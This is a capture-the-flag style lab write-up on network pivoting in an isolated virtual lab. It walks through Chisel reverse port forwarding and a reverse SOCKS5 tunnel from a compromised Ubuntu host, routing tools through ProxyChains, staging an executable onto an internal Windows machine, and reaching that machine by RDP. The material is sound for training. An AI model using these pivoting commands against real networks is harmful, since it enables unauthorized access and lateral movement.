# Network Pivoting Lab: Chisel, SOCKS5 Proxy, and RDP

## Overview

This lab demonstrates several network pivoting techniques using **Chisel**.

The main objective is to gain access to an internal network through a dual-homed Ubuntu machine acting as a pivot host.

The lab covers:

1. Reverse Port Forwarding
2. Reverse SOCKS5 Proxy
3. Transferring an executable file through the pivot host
4. Accessing a Windows machine via RDP through a SOCKS5 tunnel

## 1. Lab Architecture

The lab consists of three virtual machines in **KVM / virt-manager**.
Ubuntu has two network interfaces and acts as the pivot host.

This lab uses the repository's [standard topology](../README.md#lab-architecture-network-topology):

| Machine | Role | IP address |
|---|---|---|
| Kali Linux | Attacker machine, Chisel Server | `192.168.122.59` |
| Ubuntu-1 | Originally compromised host, Chisel Client / pivot | `192.168.122.153` and `192.168.0.139` |
| Windows | Internal host, future RDP target | `192.168.0.53` |

```text
External network: 192.168.122.0/24

Kali Linux                         Ubuntu-1
192.168.122.59  <-------------->  192.168.122.153
 Chisel Server                       Chisel Client
                                         |
                                    192.168.0.139
                                         |
                              Internal network: 192.168.0.0/24
                                         |
                                      Windows
                                    192.168.0.53
```

Kali should not have direct access to Windows. Internal resources are accessed using Ubuntu as a proxy.

## 2. Scenario

The lab's working scenario:

1.  The attacker gains initial access to Ubuntu through a vulnerable website.
2.  A Chisel executable ends up on Ubuntu.
3.  Ubuntu establishes a connection to the Chisel Server on Kali.
4.  Through the tunnel, the attacker gains access to Ubuntu's web service.
5.  A SOCKS5 tunnel is then created to explore the internal network.
6.  The next planned objective is RDP access to Windows and obtaining the second flag.

## 3. Phase 1. Reverse Port Forwarding

### Goal

Set up a reverse TCP port forward from Kali to a local web service on Ubuntu. This allows reaching Ubuntu's web application through a port on Kali.

### Starting the Chisel Server on Kali

```bash
chisel server -p 80 --reverse
```
<img width="698" height="120" alt="image" src="https://github.com/user-attachments/assets/5ca993ce-4d80-4426-98e8-b501b09b0269" />

-   `server` — run Chisel in server mode.
-   `-p 80` — port to accept connections on.
-   `--reverse` — allows reverse tunnels to be created.

### Connecting the Chisel Client on Ubuntu

```bash
./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:1337:127.0.0.1:5000
```
<img width="1247" height="97" alt="image" src="https://github.com/user-attachments/assets/bcfed733-dc47-4580-8df7-82b167e74e77" />

Parameters:

-   `192.168.122.59:80` — address and port of the Chisel Server on Kali.
-   `R` — reverse port forwarding.
-   `1337` — port opened on the Kali side.
-   `127.0.0.1:5000` — Ubuntu's local web service that connections are forwarded to.

Tunnel diagram:

```text
Kali:127.0.0.1:1337
        |
        | Chisel reverse tunnel
        |
Ubuntu:127.0.0.1:5000
```

### Verification

On Kali, you can check open ports:

```bash
ss -tulnp
```

Then send an HTTP request:

```bash
curl http://127.0.0.1:1337
```

If the tunnel works correctly, a request to port `1337` on Kali should reach Ubuntu's web service at `127.0.0.1:5000`.

CLI:
<img width="867" height="793" alt="image" src="https://github.com/user-attachments/assets/e6319bad-89d1-47cd-8ebf-b7fc137945e4" />

GUI:
<img width="1921" height="937" alt="image" src="https://github.com/user-attachments/assets/096cb489-b5a2-434c-be48-5dc5a0854653" />

### Technical takeaway

Reverse port forwarding provides access to a service that is only locally available on an intermediate machine. Chisel creates a reverse channel through which the attacker reaches that service from their own machine.

**Status:** the reverse port forwarding command was used. Later, the configuration was switched over to SOCKS5. A successful final HTTP response through `1337` was not recorded in the current logs, so it should not be considered a confirmed result.

## 4. Phase 2. Reverse SOCKS5 Proxy

### Goal

Create a SOCKS5 proxy on Kali through which TCP connections to resources reachable from Ubuntu can be routed. This lets Ubuntu be used as a pivot host for exploring the internal network.

### Starting the Chisel Server on Kali

```bash
chisel server -p 80 --reverse
```
<img width="941" height="190" alt="image" src="https://github.com/user-attachments/assets/469b8e9e-2ead-491a-929b-172859fd29db" />

### Connecting the Chisel Client on Ubuntu

```bash
./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:socks
```

<img width="552" height="57" alt="image" src="https://github.com/user-attachments/assets/a99a0029-084d-4075-bbbc-3cf31f97281a" />

The `R:socks` parameter creates a reverse SOCKS tunnel. A SOCKS5 listener appears on the Kali side at `127.0.0.1:1080`.

The following message was received in Chisel's output:

```text
2026/11/15 18:40:06 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

This confirms that the SOCKS listener is up on Kali.

### How the tunnel works

```text
Application on Kali
       |
       | SOCKS5: 127.0.0.1:1080
       |
   Chisel Server
       |
       | Chisel connection
       |
   Chisel Client on Ubuntu
       |
       |
Resource reachable from Ubuntu
```

Requests through SOCKS5 are handled on the Chisel Client side. So the address `127.0.0.1` in the target request through this proxy refers to Ubuntu's loopback interface.

### Verifying SOCKS5 via curl

```bash
curl --socks5 127.0.0.1:1080 http://127.0.0.1:5000
```
<img width="909" height="745" alt="image" src="https://github.com/user-attachments/assets/bb0e23ed-8933-40dc-ad3e-742c9407a0f7" />

Here `127.0.0.1:1080` is the SOCKS5 proxy on Kali, and `127.0.0.1:5000` is the web service relative to Ubuntu.

If the web service listens only on Ubuntu's loopback, this approach works. If it listens on a different interface, check the corresponding address and port.

### Setting up ProxyChains

ProxyChains should be configured on Kali, since that's where the applications whose traffic needs to be routed through the SOCKS5 tunnel are run.

Installation:

```bash
sudo apt update && sudo apt install proxychains4
```

Open the configuration file:

```bash
sudo nano /etc/proxychains4.conf
```

Add or uncomment the line:

```ini
socks5 127.0.0.1 1080
```

Example of running an application through the proxy:

```bash
proxychains4 curl http://127.0.0.1:5000
```

In this command, the target `127.0.0.1` also refers to Ubuntu, since the request passes through the Chisel Client.

> ProxyChains redirects supported TCP connections of individual applications. It is not full system-wide routing. A regular ICMP ping will not work through ProxyChains. For network scanning over SOCKS, a TCP connect scan (`-sT`) is typically used, along with disabling host discovery (`-Pn`) if needed.

### Current result

Confirmed message from Chisel about the reverse SOCKS listener starting on Kali:

```text
127.0.0.1:1080
```

After switching to `R:socks`, checking the old port `1337` resulted in a connection error. This is expected: the current SOCKS listener runs on `1080`, and the previous reverse port forward is no longer in use.

---

## Phase 3. Transferring a File from Kali to Windows via Ubuntu

### Goal
Transfer an EXE file from Kali to the internal Windows machine, using Ubuntu as an intermediate node and Chisel reverse port forwarding.

### Step 1. Starting the Chisel Server on Ubuntu
On Ubuntu:

```
./chisel_1.12.0_linux_amd64 server -p 8888 --reverse
```
<img width="600" height="64" alt="image" src="https://github.com/user-attachments/assets/2a81455a-4a8c-4570-91e4-3b4d4db2b617" />

Ubuntu accepts the Chisel connection from Kali and allows reverse tunnels.

### Step 2. Starting a Python HTTP Server on Kali

Navigate to the directory containing the file to transfer:
Download: [GitHub](https://github.com/jpillora/chisel/releases/tag/v1.12.0)
```
cd path/to/file.exe
```

Start an HTTP server on the loopback interface:

```
python3 -m http.server 1337 --bind 127.0.0.1
```

The file becomes available locally on Kali at:

```
http://127.0.0.1:1337/<filename>.exe
```

### Step 3. Connecting the Chisel Client from Kali

On Kali:

```
./chisel_1.12.0_linux_amd64 client 192.168.122.153:8888 R:8081:127.0.0.1:1337
```
<img width="570" height="108" alt="image" src="https://github.com/user-attachments/assets/c0a10b4a-ffae-4c34-983d-9ed49f043164" />

Parameter breakdown:

- `192.168.122.153:8888` — Chisel Server on Ubuntu;
- `R` — reverse port forwarding;
- `8081` — port opened on the Ubuntu side;
- `127.0.0.1:1337` — Python HTTP Server on Kali.

Logical forwarding diagram:

```
Windows
   |
   | HTTP request to Ubuntu:8081
   v
Ubuntu (Chisel Server)
   |
   | reverse tunnel
   v
Kali (Chisel Client)
   |
   v
127.0.0.1:1337
Python HTTP Server
```

### Step 4. Downloading the File on Windows

On Windows, run:

```
curl.exe http://192.168.0.139:8081/<filename>.exe -o <filename>.exe
```

<img width="547" height="359" alt="image" src="https://github.com/user-attachments/assets/18c501ee-ca27-43e9-b75f-1fc96b3dce68" />

The request arrives at Ubuntu over the internal network. Chisel forwards it to the HTTP server on Kali, from which Windows receives the file.

### 5. Connecting to Windows via RDP

On Kali, run FreeRDP through ProxyChains:

```bash
proxychains4 xfreerdp3 /v:192.168.0.53:3389 /u:Administrator
```

The password is entered interactively if the client prompts for it. Passing the password directly via `/p:` is not recommended, since it can end up in shell history or the process list.

### Connection diagram

```text
Kali Linux
FreeRDP
   |
   v
ProxyChains
   |
   v
127.0.0.1:1080
SOCKS5 Listener
   |
   v
Chisel Server (Kali)
   |
   | Reverse Tunnel
   v
Chisel Client (Ubuntu)
   |
   v
Windows 192.168.0.53:3389
RDP
```

### Result

**Flag successfully obtained:**

```text
FLAG{IMPROVE_YOU_PIVOTING}
```

After connecting to Windows via RDP through the Chisel Reverse SOCKS5 tunnel and ProxyChains, the flag was read.

---

# Technical Takeaways

The following were used during this lab:

- **Chisel** — Reverse Port Forwarding and SOCKS5 tunneling.
- **Python HTTP Server** — file transfer over HTTP.
- **ProxyChains** — redirecting application TCP connections through SOCKS5.
- **FreeRDP** — connecting to Windows via RDP.
- **Ubuntu** — intermediate node (Pivot Host) with two network interfaces.

The lab covered port forwarding mechanisms and building a SOCKS5 tunnel through an intermediate node.

Key point: the SOCKS5 listener `127.0.0.1:1080` is located on Kali. Ubuntu initiates the Chisel connection to Kali, and requests to internal resources are handled on the Ubuntu side.

---

# Repository Materials

It's recommended to add screenshots confirming each phase:

1. Chisel Server and Client for Phase 1.
2. Chisel's message about the SOCKS listener starting, for Phase 2.
3. Python HTTP Server, Chisel Client, and a successful file download on Windows, for Phase 3.
4. ProxyChains configuration without secrets, the FreeRDP connection, and the obtained flag, for Phase 4.

Before publishing, check screenshots and commands for the absence of passwords, tokens, private keys, and other secrets.
